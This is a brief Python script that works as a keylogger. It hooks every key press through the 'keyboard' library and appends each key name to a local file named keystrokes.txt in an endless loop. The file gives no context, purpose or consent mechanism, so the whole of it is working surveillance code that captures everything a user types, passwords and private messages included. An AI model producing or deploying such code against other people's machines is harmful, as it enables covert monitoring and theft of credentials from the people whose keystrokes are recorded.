import keyboard

log_file = 'keystrokes.txt'

def on_key_press(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.name))

def run_script():
    while True:
        keyboard.on_press(on_key_press)
        keyboard.wait()

if __name__ == "__main__":
    run_script()
